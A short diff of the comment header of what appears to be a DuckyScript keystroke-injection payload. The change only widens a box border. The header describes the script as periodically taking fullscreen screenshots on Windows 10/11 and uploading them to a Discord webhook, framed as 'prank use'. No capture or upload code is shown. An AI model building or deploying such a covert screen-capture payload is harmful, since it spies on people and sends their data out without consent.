@@ -1,4 +1,4 @@
-REM ┌───────────────────────────────────────────────┐
+REM ┌─────────────────────────────────────────────────────┐
 REM │ hooker01 | github.com/hooker01                      │
 REM │ Description: Periodically captures fullscreen       │
 REM │              screenshots and uploads them to a      │
@@ -6,7 +6,7 @@ REM │              specified Discord webhook URL.         │
 REM │ Note: Replace 'WEBHOOK_LINK' with your webhook.     │
 REM │ Purpose: Educational and prank use only.            │
 REM │ Target: Windows 10/11                               │
-REM └───────────────────────────────────────────────┘
+REM └─────────────────────────────────────────────────────┘
 
 
 DELAY 400
